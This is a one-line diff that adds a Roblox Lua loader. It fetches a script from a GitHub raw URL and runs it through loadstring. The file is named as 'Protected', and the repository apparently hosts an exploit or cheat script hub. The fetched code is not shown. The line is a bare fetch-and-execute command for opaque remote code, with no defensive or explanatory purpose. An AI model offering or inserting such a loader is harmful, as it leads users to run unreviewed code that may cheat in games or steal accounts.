@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FeliciaXxxTop/fellprogramp2hub/main/Protected_7313188259984987.lua.txt"))()
